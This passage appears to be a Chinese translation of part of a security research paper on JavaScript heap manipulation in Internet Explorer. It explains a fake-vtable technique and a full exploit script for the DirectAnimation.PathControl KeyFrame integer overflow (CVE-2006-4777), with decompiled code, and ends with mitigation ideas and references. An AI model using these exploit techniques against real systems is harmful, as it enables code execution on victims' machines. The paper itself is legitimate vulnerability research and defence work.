如果我们用 `0x151e58` 覆盖一个对象指针，并且释放一个大小为 1008 字节、包含伪造虚表的块，那么任何通过虚表的虚函数调用都将跳转到我们选择的地址。`HeapLib` 中的 `vtable()` 函数可以用来伪造虚表。它接受一个 shellcode 字符串和一个 `jmp ecx` 跳板作为参数，并且为下列数据分配一个 1008 字节的块：

```
string length   jmp +124   addr of jmp ecx   sub [eax], al*2   shellcode  null terminator
4 bytes         4 bytes    124 bytes         4 bytes           x bytes    2 bytes
```

调用者负责把这个虚表释放到快表中并使用这个快表链表头地址覆盖一个对象指针。伪造虚表用来攻击那些对象指针储存在 `eax` 寄存器中且虚表地址储存在 `ecx` 寄存器中的虚函数调用：

```assembly
mov ecx, dword ptr [eax]    ; 获取虚表地址
push eax                    ; 将 C++ this 指针作为第一个参数传入
call dword ptr [ecx+08h]    ; 调用位于虚表偏移 0x8 处的函数
```

从 `ecx+8` 到 `ecx+0x80` 的任何虚函数调用都将使控制流转向 `jmp ecx` 跳板。由于 `ecx` 指向伪造虚表，因此跳板会将控制流引回虚表所在内存块的起始处。在被使用时，这个块的前 4 个字节表示字符串长度，但是在释放到快表后，该位置被覆盖为 `NULL`。4 个 0 字节对应的汇编指令是 `add [eax], al`。控制流抵达 `jmp +124` 指令后，跳过所有虚函数指针，到达两个 `sub [eax], al` 指令处。这两条指令将修复前面 `add` 指令造成的影响，最终 shellcode 将被执行。

## 8 利用 HeapLib 库攻击堆漏洞

### 8.1 DirectAnimation.PathControl KeyFrame 漏洞

作为第一个例子，我们介绍位于 ActiveX 组件 `DirectAnimation.PathControl` 中的整数溢出漏洞（CVE-2006-4777）。这个漏洞能够通过创建 ActiveX 并以大于 `0x07ffffff` 的值作为第一个参数调用它的 `KeyFrame()` 方法来触发。

微软 DirectAnimation SDK 文档对 `KeyFrame()` 方法的介绍如下：

> **KeyFrame 方法**
> 
> 指定路径上的 x、y坐标以及到达每个点的时间。第一个点定义了路径的起点。只有当路径停止时，这个方法才能被使用或修改。
> 
> 语法规则
> 
> `KeyFrameArray = Array( x1, y1, ..., xN, yN )`
> `TimeFrameArray = Array( time2 , ..., timeN )`
> `pathObj.KeyFrame( npoints, KeyFrameArray, TimeFrameArray )`
> 
> 参数
> 
> `npoints`
> 用来定义路径的点的个数。
> `x1, y1,..., xN, yN`
> 设定路径上点的 x、y 坐标。
> `time2,..., timeN`
> 路径上一个点到达下一个点各自所用的时间
> `KeyFrameArray`
> 包含 x、y 坐标定义的数组。
> `TimeFrameArray`
> 包含从 x1、y1 到 xN、yN（路径上最后一组点）所有这些定义了路径的点之间的时间值。路径从 x1、y1 于 0 时刻开始。

下面的 JavaScript 代码将触发漏洞：

```js
var target = new ActiveXObject("DirectAnimation.PathControl");
target.KeyFrame(0x7fffffff, new Array(1), new Array(1));
```

### 8.2 漏洞代码段

漏洞位于 `DAXCTLE.OCX` 中的 `CPathCtl::KeyFrame` 函数内。该函数的反编译代码如下：

```c
long __stdcall CPathCtl::KeyFrame(unsigned int npoints,
                                     struct tagVARIANT KeyFrameArray,
                                     struct tagVARIANT TimeFrameArray)
{
    int err = 0;
    ...
    // new 操作符是对 CMemManager::AllocBuffer 的包装。
    // 如果长度小于 0x2000，它会从 CMemManager 堆分配块，否则它等价于：
    // HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size+8) + 8
    buf_1                  = new((npoints*2) * 8);
    buf_2                  = new((npoints-1) * 8);
    KeyFrameArray.field_C  = new(npoints*4);
    TimeFrameArray.field_C = new(npoints*4);
    if (buf_1 == NULL || buf_2 == NULL || KeyFrameArray.field_C == NULL ||
           TimeFrameArray.field_C == NULL)
    {
        err = E_OUTOFMEMORY;
        goto cleanup;
    }
    // 如果 KeyFrameArray 长度小于 npoints*2 或者 TimeFrameArray 长度小于 npoints-1，我们将设置一个错误值并转入扫尾代码段
    if ( KeyFrameArrayAccessor.ToDoubleArray(npoints*2, buf_1) < 0 ||
           TimeFrameArrayAccessor.ToDoubleArray(npoints-1, buf_2) < 0)
    {
        err = E_FAIL;
        goto cleanup;
    }
    ...

cleanup:
    if (npoints > 0){
        // 我们从 0 遍历到 npoints，对每一个 KeyFrameArray->field_C 和 TimeFrameArray->field_C 的非零元素调用虚函数
        for (i = 0; i < npoints; i++) {
            if (KeyFrameArray.field_C[i] != NULL)
                KeyFrameArray.field_C[i]->func_8();
            if (TimeFrameArray.field_C[i] != NULL)
                TimeFrameArray.field_C[i]->func_8();
        } 
    }
    ...
    return err;
}
```

`KeyFrame` 函数将 `npoints` 参数分别乘以 16、8 和 4，并分配 4 个缓冲区。如果 `npoints` 大于 `0x40000000`，用于分配的大小参数将发生溢出，这个函数将分配到 4 个小缓冲区。在我们的漏洞利用程序中，`npoints` 被置为 `0x40000801`，因此该函数将分配到大小分别为 `0x8010`、`0x4008` 和两个大小为 `0x200c` 的缓冲区。我们要保证最小的缓冲区大小大于 `0x2000` 字节，因为再小的话，分配的内存将来自 `CMemManager` 堆而非系统内存分配器。

分配缓冲区后，这个函数调用 `CSafeArrayOfDoublesAccessor::ToDoubleArray()` 来初始化数组访问器对象。如果 `KeyFrameArray` 的大小小于 `npoints`，`ToDoubleArray` 将返回 `E_INVALIDARG`。`cleanup` 部分的代码将执行，它将遍历这两个 `0x2004` 字节的缓冲区并对每一个非空元素调用一个虚函数。

这些缓冲区在分配时带有 `HEAP_ZERO_MEMORY` 标志，仅仅包含 `NULL` 指针。然而，上面的代码将从 0 遍历到 `npoints`（也就是 `0x40000801`），并继续直到越过缓冲区界限 `0x200c` 访问到外面的数据。如果我们控制了 `KeyFrameArray.field_C` 缓冲区外的第一个四字，我们就可以将它指向一个伪造对象，这个伪造对象的虚表则包含指向 shellcode 的指针。虚函数 `func_8()` 的调用将执行我们的 shellcode。

### 8.3 实施攻击

为了利用这个漏洞，我们需要控制 `0x200c` 字节的缓冲区外的第一个四字。首先，我们要使用 `0x2010` 大小的块来清除堆碎片（内存分配器分配的内存是 8 的整数倍，因此 `0x200c` 向上取整为 `0x2010`）。然后我们分配两个 `0x2020` 字节的内存块，在偏移 `0x200c` 处写入伪造的对象指针，接着将它们释放到空表中。

当 `KeyFrame` 函数分配两个 `0x200c` 字节的缓冲区时，内存分配器将重用我们的 `0x2020` 字节块，并仅仅将前 `0x200c` 字节置零。`KeyFrame` 函数最后扫尾的循环体将遇到偏移 `0x200c` 处的伪造对象指针，接着会通过它的虚表调用函数。伪造对象指针指向 `0x151e58`，它正是维护大小为 `1008` 字节内存块的快表链表头的地址。链表中唯一的项就是我们伪造的虚表。

调用虚函数的代码段如下：

```assembly
.text:100071E4          mov     eax, [eax]      ; object pointer
.text:100071E6          mov     ecx, [eax]      ; vtable
.text:100071E8          push    eax
.text:100071E9          call    dword ptr [ecx+8]
```

虚函数调用通过 `ecx+8` 实现，它将控制流转向一个 `IEXPLORER.EXE` 中的 `jmp ecx` 跳板。控制流接着会转向虚表的开头并执行 shellcode。上一节讲述了更多关于虚表的详细信息。

完整的漏洞利用代码如下：

```js
// 创建 ActiveX 对象
var target = new ActiveXObject("DirectAnimation.PathControl");

// 初始化堆库
var heap = new heapLib.ie();

// int3 shellcode
var shellcode = unescape("%uCCCC");

// IEXPLORE.EXE 中的 jmp ecx 跳板地址 
var jmpecx = 0x4058b5;

// 创建指向 shellcode 的伪造虚表
var vtable = heap.vtable(shellcode, jmpecx);

// 获取将要指向伪造虚表的快表地址
var fakeObjPtr = heap.lookasideAddr(vtable);

// 创建包含伪造对象地址的堆块
//
// len      padding         fake obj pointer  padding   null
// 4 bytes  0x200C-4 bytes  4 bytes           14 bytes  2 bytes
var fakeObjChunk = heap.padding((0x200c-4)/2) + heap.addr(fakeObjPtr) + heap.padding(14/2);

heap.gc();
heap.debugHeap(true);

// 清空快表
heap.debug("Emptying the lookaside")
for (var i = 0; i < 100; i++)
    heap.alloc(vtable)

// 将虚表放入快表
heap.debug("Putting the vtable on the lookaside")
heap.lookaside(vtable);

// 清除堆碎片
heap.debug("Defragmenting the heap with blocks of size 0x2010")
for (var i = 0; i < 100; i++)
    heap.alloc(0x2010)

// 将包含伪造对象指针的块放入空表
heap.debug("Creating two holes of size 0x2020");
heap.freeList(fakeObjChunk, 2);

// 触发漏洞利用程序
target.KeyFrame(0x40000801, new Array(1), new Array(1));

// 扫尾
heap.debugHeap(false);
```

## 9 补救措施

本节将简要介绍一些保护浏览器免受上述技术攻击的思路。

### 9.1 堆隔离

最明显的但不完全有效的方法是将 JavaScript 字符串存储在专用堆中。这需要对 `OLEAUT32` 内存分配器做一点改动，并且将导致字符串内存分配完全失效。攻击者仍然有能力操控字符串堆的布局，但是并不能直接控制 MSHTML 和 ActiveX 对象使用的堆。

如果未来的 Windows 发行版中使用了这一机制，漏洞研究的关注点可能会转向如何借助特定的 ActiveX 方法调用或 DHTML 操纵来控制 ActiveX 或 MSHTML 堆。

就安全体系结构而言，堆布局应该和栈数据或堆数据类似，被当作最优先考虑的可利用对象。就一般的设计原则而言，不可信代码不应该有权力直接访问应用程序中其他组件使用的堆。

### 9.2 不确定性

向内存分配器引入不确定性是增加堆漏洞利用不可靠度的好方法。如果攻击者无法预测特定堆的未来行为，将其设定为一个理想状态就会更加困难。这不是一个新思路，但是就我们所知，它还没有被应用在任何主流操作系统中。

## 10 总结

本文展示的堆控制技术依赖于以下事实：IE 中的 JavaScript 实现允许浏览器中不可信代码在系统堆上执行任意内存分配和释放操作。如上所述，即使是在最难利用的堆破坏漏洞中，这种程度的堆控制能力能够显著增加漏洞利用的可靠性和精确度。

未来研究的两个可能方向是 Windows VIsta 漏洞利用，以及将相同的技术应用在 Firefox、Opera 和 Safari 上。我们认为，利用脚本语言操纵堆的思想是通用的，也能够被应用到许多其他允许不可信脚本执行的系统中。

## 参考文献

### 堆技术内幕

- Windows Vista Heap Management Enhancements by Adrian Marinescu http://www.blackhat.com/presentations/bh-usa-06/BH-US-06-Marinescu.pdf

### 堆漏洞利用

- Third Generation Exploitation by Halvar Flake http://www.blackhat.com/presentations/win-usa-02/halvarflake-winsec02.ppt
- Windows Heap Overflows by David Litchfield http://www.blackhat.com/presentations/win-usa-04/bh-win-04-litchfield/bh-win-04-litchfield.ppt
- XP SP2 Heap Exploitation by Matt Conover http://www.cybertech.net/~sh0ksh0k/projects/winheap/XPSP2 Heap Exploitation.ppt
- Bypassing Windows heap protections by Nicolas Falliere http://packetstormsecurity.nl/papers/bypass/bypassing-win-heap-protections.pdf
- Defeating Microsoft Windows XP SP2 Heap Protection and DEP bypass by Alexander Anisimov http://www.maxpatrol.com/defeating-xpsp2-heap-protection.pdf
- Exploiting Freelist[0] on XP SP2 by Brett Moore http://www.security-assessment.com/Whitepapers/Exploiting_Freelist[0]_On_XPSP2.zip

### JavaScript 技术内幕

- How Do The Script Garbage Collectors Work? by Eric Lippert http://blogs.msdn.com/ericlippert/archive/2003/09/17/53038.aspx

### IE 浏览器漏洞利用

- Internet Explorer IFRAMG exploit by SkyLined http://www.edup.tudelft.nl/~bjwever/advisory_iframe.html.php
- ie_webview_setslice exploit by H D Moore http://metasploit.com/projects/Framework/exploits.html#ie_webview_setslice

## 注释

- [1] http://www.edup.tudelft.nl/~bjwever/advisory_iframe.html.php
- [2] http://msdn2.microsoft.com/en-us/library/ms221069.aspx
- [3] https://blogs.msdn.microsoft.com/ericlippert/archive/2003/09/17/53038.aspx